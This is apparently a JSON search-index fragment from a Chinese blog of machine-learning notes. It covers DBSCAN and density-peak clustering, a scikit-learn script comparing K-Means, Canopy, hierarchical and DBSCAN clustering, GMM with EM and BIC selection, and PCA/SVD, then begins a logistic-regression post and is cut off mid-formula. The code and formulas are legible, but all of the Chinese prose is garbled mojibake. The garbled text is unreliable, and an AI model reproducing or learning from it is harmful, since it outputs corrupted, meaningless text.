å¯†åº¦å¯è¾¾ï¼šå¦‚æœå­˜åœ¨ä¸€ä¸ªå¯¹è±¡é“¾ä½¿å¾—ç›¸é‚»ä¸¤å¯¹è±¡ç›´æ¥å¯†åº¦å¯è¾¾ï¼Œåˆ™ç§°å¯¹è±¡é“¾é¦–å°¾å¯†åº¦å¯è¾¾ å¯†åº¦ç›¸è¿ï¼šè‹¥oå¯†åº¦å¯è¾¾pï¼Œoå¯†åº¦å¯è¾¾qï¼Œåˆ™pï¼Œqå¯†åº¦ç›¸è¿ DB-SCANé€šè¿‡æ£€æŸ¥æ•°æ®é›†ä¸­æ¯ä¸ªå¯¹è±¡çš„eé‚»åŸŸæ¥å¯»æ‰¾èšç±» å¦‚æœä¸€ä¸ªç‚¹pæ˜¯æ ¸å¿ƒå¯¹è±¡åˆ™ä»¥pä¸ºä¸­å¿ƒåˆ›å»ºæ–°ç°‡ã€‚ä¾æ®pæ¥åå¤å¯»æ‰¾å¯†åº¦ç›¸è¿çš„é›†åˆï¼ˆå¯èƒ½åˆå¹¶åŸæœ‰ç°‡ï¼‰ï¼Œå½“æ²¡æœ‰æ–°ç‚¹æ—¶å¯»æ‰¾ç»“æŸ å¯†åº¦æœ€å¤§å€¼èšç±» å±€éƒ¨å¯†åº¦ï¼š $$ \\displaystyle{\\rho_i = \\sum_j\\chi(d_{ij}-d_c), å…¶ä¸­ \\chi(x) = } \\begin{cases} 1 \u0026, x \u003c 0 \\\\ 0 \u0026, otherwise \\end{cases} $$ $D_c$ æ˜¯ä¸€ä¸ªæˆªæ–­è·ç¦»ï¼Œ$\\rho_i$ å³åˆ°å¯¹è±¡ $i$ çš„è·ç¦»å°äº $D_c$ çš„å¯¹è±¡çš„ä¸ªæ•°ï¼Œå³ï¼š $\\rho_i$ = ä»»ä½•ä¸€ä¸ªç‚¹ä»¥ $D_c$ ä¸ºåŠå¾„çš„åœ†å†…çš„æ ·æœ¬ç‚¹çš„æ•°é‡ï¼Œ $D_c$ çš„è®¾å®šç»éªŒæ˜¯ä½¿æ¯ä¸ªç‚¹çš„é‚»å±…æ•°ç›®æ˜¯æ‰€æœ‰ç‚¹çš„ 1% ~ 2% 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 import time import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import make_blobs # ç”Ÿæˆé«˜æ–¯blobæ•°æ® from sklearn.cluster import KMeans,AgglomerativeClustering,DBSCAN # KMeansã€å±‚æ¬¡ã€å¯†åº¦èšç±» from sklearn.metrics import adjusted_rand_score,silhouette_score from sklearn.preprocessing import StandardScaler titles = [\u0026#39;Ground Truth\u0026#39;,\u0026#39;K-Means(random)\u0026#39;,\u0026#39;K-Means++\u0026#39;,\u0026#39;K-Means(Canopy)\u0026#39;,\u0026#39;Hierarchical\u0026#39;,\u0026#39;DBSCAN\u0026#39;] # colors = [ # \u0026#39;#e41a1c\u0026#39;, \u0026#39;#377eb8\u0026#39;, \u0026#39;#4daf4a\u0026#39;, \u0026#39;#984ea3\u0026#39;, # çº¢ è“ ç»¿ ç´« # \u0026#39;#ff7f00\u0026#39;, \u0026#39;#ffff33\u0026#39;, # æ©™ é»„ # \u0026#39;#1b9e77\u0026#39;, \u0026#39;#d95f02\u0026#39;, \u0026#39;#7570b3\u0026#39;, \u0026#39;#e7298a\u0026#39;, # é’ æ£• é› æ´‹çº¢ # \u0026#39;#66a61e\u0026#39;, \u0026#39;#666666\u0026#39; # è‰ç»¿ æ·±ç° # ] # markers = [ # \u0026#39;o\u0026#39;, # åœ† # \u0026#39;s\u0026#39;, # æ–¹ # \u0026#39;^\u0026#39;, # ä¸Šä¸‰è§’ # \u0026#39;d\u0026#39;, # é’»çŸ³ # \u0026#39;v\u0026#39;, # ä¸‹ä¸‰è§’ # \u0026#39;p\u0026#39;, # äº”è¾¹å½¢ # \u0026#39;*\u0026#39;, # æ˜Ÿå· # \u0026#39;h\u0026#39;, # å…­è¾¹å½¢1 # \u0026#39;H\u0026#39;, # å…­è¾¹å½¢2 # \u0026#39;8\u0026#39;, # å…«è¾¹å½¢ # \u0026#39;\u0026gt;\u0026#39;, # å³ä¸‰è§’ # \u0026#39;\u0026lt;\u0026#39; # å·¦ä¸‰è§’ # ] # æ•°æ®å¯è§†åŒ– def data_visualization_only(x,y): plt.scatter(x[:,0],x[:,1],s=12,c=y) plt.show() def data_visualization_all(labels,times): fix,axes = plt.subplots(2,3,figsize=(20,12)) axes = axes.flatten() for index,(ax,lab,tit,t) in enumerate(zip(axes,labels,titles,times)): ax.scatter(X[:,0],X[:,1],c=lab,s=12,cmap=\u0026#39;tab10\u0026#39;,) ax.set_title(f\u0026#34;{tit}({t:.4f}s)\u0026#34;) # ax.set_title(tit+\u0026#34;(\u0026#34;++\u0026#34;s)\u0026#34;) ax.set_xticks([]) ax.set_yticks([]) plt.tight_layout() plt.show() # ä¸€ æ„é€ æ¨¡æ‹Ÿæ•°æ® centers = [(0,0),(8,8),(-5,10),(10,-4)] # æ ·æœ¬ä¸­å¿ƒ cluster_std = [1.2, 0.8, 2.0, 0.5] # æ ‡å‡†å·® n_samples = [800,600,400,200] # æ ·æœ¬æ•°é‡ X,y_true = make_blobs( n_samples=n_samples, centers=centers, cluster_std=cluster_std, random_state=42 ) # data_visualization_only(X,y_true) # äºŒ ç®—æ³•å®ç° def kmeans_random(X, k): \u0026#39;\u0026#39;\u0026#39; æ ‡å‡†K-Meansç®—æ³•ï¼Œéšæœºé€‰æ‹©åˆå§‹ä¸­å¿ƒ \u0026#39;\u0026#39;\u0026#39; start = time.time() model = KMeans( n_clusters=k, init=\u0026#39;random\u0026#39;, n_init=10, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def kmeans_pp(X,k): \u0026#39;\u0026#39;\u0026#39; K-Means++:æ™ºèƒ½åˆå§‹åŒ–ï¼Œè¿œç¦»åœ°é€‰æ‹©ä¸­å¿ƒ \u0026#39;\u0026#39;\u0026#39; start=time.time() model = KMeans( n_clusters=k, init=\u0026#39;k-means++\u0026#39;, n_init=10, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def kmeans_canopy(X,t1=4.0,t2=2.0): \u0026#39;\u0026#39;\u0026#39; K-Means+Canopyã€‚æ™ºèƒ½é€‰æ‹©kå’Œåˆå§‹åŒ–ä¸­å¿ƒ \u0026#39;\u0026#39;\u0026#39; start = time.time() canopies=[] X_copy = X.copy() np.random.shuffle(X_copy) for pt in X_copy: if any(np.linalg.norm(pt-c) \u0026lt; t2 for c in canopies): continue canopies.append(pt) k = len(canopies) model = KMeans( n_clusters=k, init=np.vstack(canopies), n_init=1, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def hierarchical(X,k): \u0026#39;\u0026#39;\u0026#39; å‡èšå±‚æ¬¡èšç±»ï¼Œä½¿ç”¨Wardæ–¹å·®æœ€å°åŒ–å‡†åˆ™ \u0026#39;\u0026#39;\u0026#39; start = time.time() model = AgglomerativeClustering( n_clusters=k, linkage=\u0026#39;ward\u0026#39; ) labels = model.fit_predict(X) return labels,time.time()-start def dbscan(X): \u0026#39;\u0026#39;\u0026#39; å¯†åº¦èšç±»DBSCAN \u0026#39;\u0026#39;\u0026#39; start = time.time() X_stand = StandardScaler().fit_transform(X) model = DBSCAN( eps = 0.35, # æŒ‡å®šeé‚»åŸŸ min_samples=5 # æŒ‡å®šm ) labels = model.fit_predict(X_stand) return labels,time.time()-start # ä¸‰ æ•°æ®è®­ç»ƒ k_true = len(set(y_true)) labels_random ,t_random = kmeans_random(X,k_true) labels_pp ,t_pp = kmeans_pp(X,k_true) labels_canopy ,t_canopy = kmeans_canopy(X,30,15) labels_hier ,t_hier = hierarchical(X,k_true) labels_dbscan ,t_dbscan = dbscan(X) labels = [ y_true, labels_random, labels_pp, labels_canopy, labels_hier, labels_dbscan ] times = [ 0, t_random, t_pp, t_canopy, t_hier, t_dbscan ] # å›› ç»“æœè¯„ä¼° def evaluate(name,labels,time): ari = adjusted_rand_score(y_true,labels) # ä»»æ„ä¸€å¯¹æ ·æœ¬ï¼Œçœ‹â€œé¢„æµ‹æ˜¯å¦åŒç°‡â€ä¸â€œçœŸå®æ˜¯å¦åŒç±»â€ä¸€è‡´çš„æ¯”ä¾‹ # è½®å»“ç³»æ•°ï¼šaä¸ºæ ·æœ¬ä¸åŒç°‡å…¶ä»–ç‚¹çš„å¹³å‡è·ç¦»ï¼›bæ˜¯æ ·æœ¬ä¸æœ€è¿‘é‚»ç°‡æ‰€æœ‰ç‚¹çš„å¹³å‡è·ç¦» # è½®å»“ç³»æ•° si_i = (b-a)/max(a,b)ã€‚è½®å»“ç³»æ•°çº¦æ¥è¿‘1ï¼Œç°‡é—´è·ç¦»è¶Šè¿œï¼Œç°‡å†…è·ç¦»çº¦è¿‘ï¼Œèšç±»è¶Šç†æƒ³ sil = silhouette_score(X,labels) if len(set(labels))\u0026gt;1 else np.nan print(f\u0026#34;{name:15s} | ARI={ari:5.3f} | Sil={sil:5.3f} | Time={time:.3f}s\u0026#34;) for index,(label,time) in enumerate(zip(labels,times)): evaluate(titles[index],label,time) # äº” å¯è§†åŒ– data_visualization_all(labels,times) Ground Truth | ARI=1.000 | Sil=0.801 | Time=0.000s K-Means(random) | ARI=0.999 | Sil=0.801 | Time=0.012s K-Means++ | ARI=0.999 | Sil=0.801 | Time=0.014s K-Means(Canopy) | ARI=0.823 | Sil=0.687 | Time=0.013s Hierarchical | ARI=1.000 | Sil=0.801 | Time=0.068s DBSCAN | ARI=0.999 | Sil=0.769 | Time=0.025s é«˜æ–¯æ··åˆæ¨¡å‹ï¼ˆGMMæ¨¡å‹ï¼‰ å•ä¸ªé«˜æ–¯åˆ†å¸ƒï¼ˆGMï¼‰ é«˜æ–¯åˆ†å¸ƒï¼š$N(\\mu,\\sigma)$ é€šè¿‡MLEæ€æƒ³ä¼°è®¡ $\\mu$ å’Œ $\\sigma$ : $$\\displaystyle{\\hat \\mu=\\frac{1}{n}\\sum_{i \\in \\{1,2 \\dots n\\}} x_i=\\bar x}$$ $$\\displaystyle{\\hat \\sigma^2=\\frac{1}{n}\\sum_{i \\in \\{1,2 \\dots n\\}}(x_i-\\hat\\mu)^2$$ æ··åˆé«˜æ–¯æ¨¡å‹ï¼ˆGMMï¼‰ GMMï¼šå‡è®¾éšæœºå˜é‡ $X$ æ˜¯ç”± $k$ ä¸ªé«˜æ–¯åˆ†å¸ƒæ··åˆè€Œæ¥ï¼Œå–åˆ°å„ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æ¦‚ç‡ä¸º $\\pi_1,\\pi_2 \\dots \\pi_k$ ï¼Œç¬¬ $i$ ä¸ªé«˜æ–¯åˆ†å¸ƒçš„å‡å€¼ä¸º $\\mu_i$ ï¼Œæ ‡å‡†å·®ä¸º $\\sigma_i$ ã€‚å½“å‰è§‚æµ‹åˆ°ä¸€ç³»åˆ—æ ·æœ¬ $X_1,X_2\\dots X_n$ ï¼Œä¼°è®¡å‚æ•°å‘é‡ï¼š $\\piï¼Œ\\muï¼Œ\\sigma$ $$\\displaystyle{L_{\\pi,\\mu,\\sigma}(X) = \\sum^N_{i=1}\\log P(X_i)\\overset{\\text{å…¨æ¦‚ç‡å…¬å¼}}{=}\\sum^N_{i=1}\\log(\\sum^K_{k=1}\\pi_kN(x_i|\\mu_k,\\sigma_k))}$$ EMç®—æ³•æ±‚è§£ä¼°è®¡ $\\piï¼Œ\\muï¼Œ\\sigma$ EMç®—æ³• Jensenä¸ç­‰å¼ï¼šè‹¥fæ˜¯å‡¸å‡½æ•°ï¼Œxæ˜¯éšæœºå˜é‡ã€‚æœ‰ï¼š $$f(\\mathcal{E}x) \\le \\mathcal{E}f(x),\\displaystyle{\\sum_i \\mathcal{E}_i=1}$$ E-Stepï¼ˆæ±‚è´£ä»»åº¦ï¼‰ä¸M-Stepï¼ˆæ›´æ–°å‚æ•°ï¼‰ GMMæµç¨‹ å˜é‡ä»‹ç»ï¼š $ N $ ä¸ºæ•°æ®é›†ä¸­æ ·æœ¬æ€»æ•°é‡ $ N_k $ ä¸ºç¬¬ $ k $ ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æœ‰æ•ˆæ•°æ®ç‚¹æ•°é‡ $ K $ ä¸ºèšç±»æ•°ï¼ˆå³é¢„è®¾çš„é«˜æ–¯åˆ†å¸ƒæ•°é‡ï¼‰ $ X $ ä¸ºæ•´ä¸ªæ•°æ®é›†ï¼ˆ $ X_i $ ä¸ºç¬¬ $ i $ ä¸ªæ•°æ®å‘é‡ï¼‰ $ \\pi_k $ ä¸ºç¬¬ $ k $ ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æ··åˆç³»æ•°/æƒé‡ $ \\mu_k $ ä¸ºç¬¬ $ k $ ä¸ªé«˜æ–¯åˆ†å¸ƒçš„å‡å€¼å‘é‡ $ \\sigma_k $ ä¸ºç¬¬ $ k $ ä¸ªé«˜æ–¯åˆ†å¸ƒçš„åæ–¹å·® $ \\gamma(i,k) $ ä¸ºè´£ä»»åº¦æˆ–å“åº”åº¦ï¼ˆå³Eæ­¥è®¡ç®—æ ¸å¿ƒï¼‰ ç¬¬é›¶æ­¥ï¼šéšæœºæ‰¾ $m$ ä¸ªæ•°æ®ï¼ˆä¸­å¿ƒç‚¹ï¼‰ ç¡®å®šåˆå§‹ $\\pi,\\mu,\\sigma$ ï¼Œä¾‹å¦‚éšæœºç­‰ ç¬¬ä¸€æ­¥ï¼šä¼°è®¡æ•°æ®æ¥æºäºå“ªä¸ªåˆ†å¸ƒ(Eæ­¥â€”â€”è´£ä»»åº¦) ä»£å…¥ï¼š$$\\displaystyle{\\gamma(i,k) = P(X \\in Z_k | X=X_i) \\overset{\\text{è´å¶æ–¯å…¬å¼}}{=} \\frac{\\pi_kN(X_i|\\mu_k,\\sigma_k)}{\\displaystyle{\\sum^K_{j=1}\\pi_jN(X_i|\\mu_j,\\sigma_j)}}}$$ æ ¹æ® $\\gamma$ åˆ’åˆ†ç±»åˆ« ç¬¬äºŒæ­¥ï¼šæ›´æ–°å‚æ•°ï¼ˆ$\\piï¼Œ\\muï¼Œ\\sigma$ï¼‰ï¼ˆMæ­¥â€”â€”å‚æ•°æ›´æ–°ï¼‰ $$\\displaystyle{N_k=\\sum^N_{i=1}\\gamma(i,k)}$$ $$\\displaystyle{\\mu_k = \\frac{1}{N_k}\\displaystyle{\\sum_{i}^N\\gamma(i,k)X_i}}$$ $$\\displaystyle{\\sigma_k = \\frac{1}{N_k}\\sum^N_{i=1}\\gamma(i,k)(x_i-\\mu_k)(x_i-\\mu_k)^T}$$ $$\\displaystyle{\\pi_k = \\frac{N_k}{N}=\\frac{1}{N}\\sum_{i=1}^N\\gamma(i,k)}$$ ç¬¬ä¸‰æ­¥ï¼šè¿­ä»£ï¼Œç›´åˆ° $\\pi,\\mu,\\sigma$ ä¸å†å˜åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import time import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import make_blobs # ç”Ÿæˆé«˜æ–¯blobæ•°æ® from sklearn.mixture import GaussianMixture from sklearn.metrics import adjusted_rand_score,adjusted_mutual_info_score,silhouette_score from sklearn.preprocessing import StandardScaler # æ•°æ®å¯è§†åŒ– def data_visualization_only(x,y): plt.scatter(x[:,0],x[:,1],s=12,c=y) plt.show() # ä¸€ æ„é€ æ¨¡æ‹Ÿæ•°æ® centers = [(0,0),(8,8),(-5,10),(10,-4)] # æ ·æœ¬ä¸­å¿ƒ cluster_std = [1.2, 0.8, 2.0, 0.5] # æ ‡å‡†å·® n_samples = [800,600,400,200] # æ ·æœ¬æ•°é‡ X,y_true = make_blobs( n_samples=n_samples, centers=centers, cluster_std=cluster_std, random_state=42 ) # äºŒ ç”¨BICåœ¨2~8ä¸ªæˆåˆ†é‡Œé¢é€‰æœ€ä½³GMM(çœ‹çœ‹å‡ ä¸ªå€™é€‰æˆåˆ†æ—¶è§£é‡ŠåŠ›æœ€å¥½) n_componenrs_range = range(2,9) gmms=[GaussianMixture(n,random_state=42).fit(X) for n in n_componenrs_range] bics = [g.bic(X) for g in gmms] best_gmm = gmms[np.argmin(bics)] print(gmms.index(best_gmm)) # ä¸‰ èšç±»ä¸è¯„ä¼° y_pred = best_gmm.predict(X) ari = adjusted_rand_score(y_true,y_pred) ami = adjusted_mutual_info_score(y_true,y_pred) sil = silhouette_score(X,y_pred) print(f\u0026#34;ARI: {ari:.3f} AMI: {ami:.3f} Silhouette: {sil:.3f}\u0026#34;) # data_visualization_only(X,y_true) data_visualization_only(X,y_pred) 2 ARI: 1.000 AMI: 1.000 Silhouette: 0.801 é™ç»´ é™ç»´æ–¹æ³•ï¼š ç‰¹å¾æå–ï¼šç‰¹å¾æ˜ å°„ã€‚æŠŠé«˜ç»´ç©ºé—´çš„æ•°æ®æ˜ å°„åˆ°ä½ç»´ç©ºé—´ã€‚æ¯”å¦‚PCAå’ŒåŸºäºç¥ç»ç½‘ç»œçš„é™ç»´ç­‰ ç‰¹å¾é€‰æ‹©ï¼š è¿‡æ»¤å¼ï¼ˆæ‰“åˆ†æœºåˆ¶ï¼‰ï¼šé€šè¿‡æŸä¸ªé˜ˆå€¼è¿›è¡Œè¿‡æ»¤ã€‚æ¯”å¦‚æ ¹æ®æ–¹å·®ã€ä¿¡æ¯å¢ç›Šã€äº’ä¿¡æ¯è¿‡æ»¤ç»å¸¸ä¼šçœ‹åˆ°ä½†å¯èƒ½ä¸ä¼šå»ç”¨çš„ä¿¡æ¯ ç‹¬ç«‹äºä»»ä½•æœºå™¨å­¦ä¹ ç®—æ³•ã€‚å®ƒåŸºäºæ•°æ®æœ¬èº«çš„ç»Ÿè®¡ç‰¹å¾ï¼ˆå¦‚ç›¸å…³æ€§ã€äº’ä¿¡æ¯ï¼‰å¯¹ç‰¹å¾è¿›è¡Œè¯„åˆ†å’Œç­›é€‰ï¼Œå°±åƒç”¨ä¸€ä¸ªâ€œè¿‡æ»¤å™¨â€æŠŠä¸å¥½çš„ç‰¹å¾è¿‡æ»¤æ‰ã€‚ ä¼˜ç‚¹ï¼šå¿«ï¼Œè®¡ç®—å¼€é”€å°ï¼Œä¸ä¾èµ–å…·ä½“æ¨¡å‹ã€‚ ç¼ºç‚¹ï¼šå¯èƒ½å¿½ç•¥ç‰¹å¾ä¸æ¨¡å‹çš„ååŒä½œç”¨ï¼Œé€‰å‡ºçš„ç‰¹å¾å•ç‹¬çœ‹å¾ˆå¼ºï¼Œä½†ç»„åˆèµ·æ¥å¯¹ç‰¹å®šæ¨¡å‹å¯èƒ½ä¸æ˜¯æœ€ä¼˜çš„ã€‚ äº’ä¿¡æ¯ï¼š$$\\displaystyle{I(X;Y)=\\sum_{x\\in X}\\sum_{y \\in Y}P(X=x,Y=y)\\log_2\\frac{P(X=x,Y=y)}{P(X=x)P(Y=y)}}$$ åŒ…è£¹å¼ï¼šæ¯æ¬¡è¿­ä»£äº§ç”Ÿä¸€ä¸ªç‰¹å¾å­é›†ï¼Œè¯„åˆ† å°†æ¨¡å‹æ€§èƒ½ä½œä¸ºè¯„ä»·æ ‡å‡†ã€‚å®ƒä¼šå°è¯•ä¸åŒçš„ç‰¹å¾å­é›†ï¼Œå¹¶ç”¨ä¸€ä¸ªç‰¹å®šçš„æœºå™¨å­¦ä¹ æ¨¡å‹å»è¯„ä¼°æ¯ä¸ªå­é›†çš„æ€§èƒ½ï¼ˆæ¯”å¦‚å‡†ç¡®ç‡ï¼‰ã€‚ ä¼˜ç‚¹ï¼šé’ˆå¯¹æ€§å¼ºï¼Œé€‰å‡ºçš„ç‰¹å¾å­é›†å¯¹è¯¥æ¨¡å‹é€šå¸¸æ€§èƒ½æœ€ä¼˜ã€‚ ç¼ºç‚¹ï¼šéå¸¸æ…¢ï¼Œè®¡ç®—å¼€é”€å¤§ï¼Œå®¹æ˜“è¿‡æ‹Ÿåˆã€‚ åµŒå…¥å¼ï¼šå…ˆé€šè¿‡æœºå™¨å­¦ä¹ æ¨¡å‹è®­ç»ƒæ¥å¯¹æ¯ä¸ªç‰¹å¾æåˆ°ä¸€ä¸ªæƒå€¼ã€‚æ¥ä¸‹æ¥å’Œè¿‡æ»¤å¼ç±»ä¼¼ï¼Œé€šè¿‡è®¾å®šæŸä¸ªé˜ˆå€¼æ¥ç­›é€‰ç‰¹å¾ ç‰¹å¾é€‰æ‹©çš„è¿‡ç¨‹åµŒå…¥åœ¨æ¨¡å‹è®­ç»ƒè¿‡ç¨‹ä¹‹ä¸­ã€‚æ¨¡å‹åœ¨è®­ç»ƒçš„åŒæ—¶ä¼šè‡ªåŠ¨è¿›è¡Œç‰¹å¾é€‰æ‹©ã€‚ ä¼˜ç‚¹ï¼šå¹³è¡¡äº†æ•ˆç‡å’Œæ•ˆæœï¼Œæ¯”è¿‡æ»¤å¼æ›´é’ˆå¯¹æ¨¡å‹ï¼Œæ¯”åŒ…è£¹å¼å¿«å¾ˆå¤šã€‚ ç¼ºç‚¹ï¼šä¾èµ–äºå…·æœ‰å†…ç½®ç‰¹å¾é€‰æ‹©æœºåˆ¶çš„æ¨¡å‹ã€‚ PCAé™ç»´ ç®—æ³•è¿‡ç¨‹ï¼ˆå¯¹äºæ ·æœ¬çŸ©é˜µ $X_{mÃ—n}$ï¼Œä» $n$ ç»´åˆ° $k$ ç»´ï¼‰ 1ã€æ•°æ®æ ‡å‡†åŒ–ï¼ˆä¸­å¿ƒåŒ–ï¼‰ï¼šè®¡ç®—æ¯ä¸ªç‰¹å¾çš„å‡å€¼ $ X_{mean} $ ï¼Œå¦ $ X_c=X-X_{mean} $ 2ã€è®¡ç®—åæ–¹å·®çŸ©é˜µï¼š$$\\displaystyle{\\Sigma = \\frac{1}{m-1}X_c^TX_c}$$ 3ã€ç‰¹å¾å€¼åˆ†è§£ï¼ˆæ­£äº¤å¯¹è§’åŒ–ï¼‰ï¼š $$ \\begin{aligned} \u0026\\Sigma=\\chi\\Lambda \\chi^T = \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_n \\end{bmatrix} \\begin{bmatrix} \\lambda_1 \\\\ \u0026 \\lambda_2 \\\\ \u0026\u0026 \\ddots \\\\ \u0026\u0026\u0026 \\lambda_n \\end{bmatrix} \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_n \\end{bmatrix}^{T}\\\\ \u0026 \\lambda_1 \\ge \\lambda_2 \\ge \\dots \\ge \\lambda_n \\end{aligned} $$ 4ã€é€‰æ‹©ä¸»æˆåˆ†ï¼ˆ$\\lambda_1,\\lambda_2\\dots \\lambda_k,k\u0026lt;n$ï¼‰ ä¿ç•™ä¿¡æ¯é‡ï¼ˆæ–¹å·®è´¡çŒ®é‡ï¼‰ï¼š$$\\displaystyle{\\eta_{k/n} = \\frac{\\displaystyle{\\sum_{i=1}^k\\lambda_i}}{\\displaystyle{\\sum_{i=1}^n\\lambda_i}}}$$ æˆªå–æŠ•å½±çŸ©é˜µï¼š $$ \\chi_k = \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_k \\end{bmatrix} $$ 5ã€æŠ•å½±ï¼ˆé™ç»´ï¼‰ï¼š $Z=X_cÂ·\\chi_k$ Kernel PCA KernelPCAé¦–å…ˆå°† $X_{mÃ—n}$ å‡ç»´æ˜ å°„åˆ° $K_{nÃ—n}$ $K_{i,j} = F_k(X_i,X_j)$ ï¼Œ $F_k$ ä¸ºæ ¸å‡½æ•° ç‰¹å¾å€¼ç‰¹å¾å‘é‡çš„æ±‚è§£ï¼šSVDåˆ†è§£ ç›´æ¥å¯¹ $X_c$ è¿›è¡ŒSVDåˆ†è§£ï¼š$$X_c = UÂ·\\SigmaÂ·V^T$$ $ U $ æ˜¯ä¸€ä¸ª $ mÃ—m $ çš„æ­£äº¤çŸ©é˜µï¼Œå·¦å¥‡å¼‚å‘é‡ $ \\Sigma $ æ˜¯ä¸€ä¸ª $ mÃ—n $ çš„å¯¹è§’çŸ©é˜µï¼Œå¯¹è§’çº¿ä¸Šçš„å€¼ $ \\sigma_i $ æ˜¯å¥‡å¼‚å€¼ã€‚ $$\\displaystyle{\\lambda_i=\\frac{\\sigma_i^2}{m-1}}$$ $ V $ æ˜¯ä¸€ $ nÃ—n $ çš„æ­£äº¤çŸ©é˜µï¼Œå³å¥‡å¼‚å‘é‡ã€‚ $$V = \\chi $$ ","date":"2025-12-02T19:45:17+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/cover_hu_e21c7d461f016ad9.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/","title":"æœºå™¨å­¦ä¹ -æ— ç›‘ç£å­¦ä¹ "},{"content":" ç›®å½• Logisticå›å½’ï¼ˆé€»è¾‘å›å½’ï¼‰ â€”â€” äºŒåˆ†ç±» å°†å¤šåˆ†ç±»é—®é¢˜è½¬åŒ–ä¸ºåŒåˆ†ç±»é—®é¢˜ Softmaxå›å½’ï¼ˆå½’ä¸€åŒ–å‡½æ•°å›å½’ï¼‰ â€”â€” å¤šåˆ†ç±» å®è·µâ€”â€”éŸ³ä¹åˆ†ç±»å™¨ 0ã€åˆå§‹åŒ– 1ã€æ•°æ®å¤„ç†ä¸ç‰¹å¾å­˜å‚¨ 2ã€æ¨¡å‹è®­ç»ƒä¸å­˜å‚¨ 3ã€æµ‹è¯•ä¸è¯„ä¼° æ”¯æŒå‘é‡æœºï¼ˆSVMï¼ŒSupport Vector Machineï¼‰ä¸æ„ŸçŸ¥æœºï¼ˆPerceptronï¼‰ SMOç®—æ³• SVMæ¦‚ç‡åŒ–è¾“å‡º SVMåˆé¡µæŸå¤± çº¿æ€§åˆ†ç±»ï¼ˆLinear Classificationï¼‰ é€»è¾‘å›å½’ç®—æ³•ï¼šåœ¨å¤šå…ƒçº¿æ€§å›å½’ç®—æ³•çš„åŸºç¡€ä¸ŠæŠŠç»“æœç¼©æ”¾åˆ°0-1ä¹‹é—´ çº¿æ€§åˆ†ç±»å™¨ï¼ˆGLMä¸åˆ†å¸ƒçš„è¿æ¥å™¨ï¼Œå¯ä»¥é€šè¿‡å†…éƒ¨æ ¸å‡½æ•°å‡ç»´å˜æˆéçº¿æ€§ç®—æ³•ï¼‰ï¼š$$\\eta = \\theta^Tx = \\theta_0+\\theta_1x_1+â€¦â€¦+\\theta_nx_n$$ å¹¿ä¹‰çº¿æ€§æ¨¡å‹ï¼ˆGLMï¼‰ï¼š$\\displaystyle{p(y;\\eta)=b(y)e^{(\\eta^TT(y)-a(\\eta))}}$ï¼Œå…¶ä¸­$\\eta$æ˜¯è‡ªç„¶å‚æ•°ï¼Œ$T(y)$æ˜¯å……åˆ†ç»Ÿè®¡é‡ï¼Œ$a(\\eta)$æ˜¯å¯¹æ•°éƒ¨åˆ†å‡½æ•° Logisticå›å½’ï¼ˆé€»è¾‘å›å½’ï¼‰ï¼šä¼¯åŠªåˆ©-GLM Softmaxå›å½’ï¼ˆå½’ä¸€åŒ–å‡½æ•°å›å½’ï¼‰ï¼šå¤šé¡¹å¼åˆ†å¸ƒ-GLM Logisticå›å½’ï¼ˆé€»è¾‘å›å½’ï¼‰ â€”â€” äºŒåˆ†ç±» ä¼¯åŠªåˆ©åˆ†å¸ƒï¼š $$ \\displaystyle{P(y;p) = p^y (1-p)^{1-y}, \\quad y=0,1 \\Rightarrow P(y;p)=e^{(ln(\\frac{p}{1-p})y+ln(1-p))}}\\displaystyle{\\Rightarrow \\eta=ln(\\frac{p}{1-p})\\Rightarrow p=\\frac{1}{1+e^{-\\eta}}\\Rightarrow p(x)=\\frac{1}{1+e^{-\\theta^Tx}} } $$ é€»è¾‘å›å½’å‡½æ•°ï¼ˆSigmoidï¼‰ï¼š $$ \\displaystyle{\\hat y = h_\\theta(x)=g(\\theta^Tx)=\\frac{1}{1+e^{-\\theta^Tx}}} \\Rightarrow åˆ†ç•Œ:\\theta^Tx=0 $$ã€‚å½“ $\\hat y\u0026gt;0.5$ æ—¶ï¼Œ$y$ å–1ï¼›å½“ $\\hat y\u0026lt;0.5$ æ—¶ï¼Œ$y$ å–0 æŸå¤±å‡½æ•°ï¼ˆç”±æå¤§ä¼¼ç„¶æ¨å¯¼è€Œæ¥ï¼‰ï¼š $$ \\displaystyle{J(\\theta)=-[\\sum^m_{i=1}y^{(i)}lnh(x^{(i)})+(1-y^{(i)})ln(1-h(x^{(i)})]} $$ æ¢¯åº¦ä¸‹é™ï¼š $$ \\displaystyle{\\theta_j^{(k+1)} = \\theta_j^{(k)}-\\alpha\\frac{\\partial}{\\partial_{\\theta_j^{(k)}}}J(\\theta^{(k)})} $$ $$ \\displaystyle{\\frac{\\partial}{\\partial_{\\theta_j^{(k)}}}J(\\theta^{(k)}) = 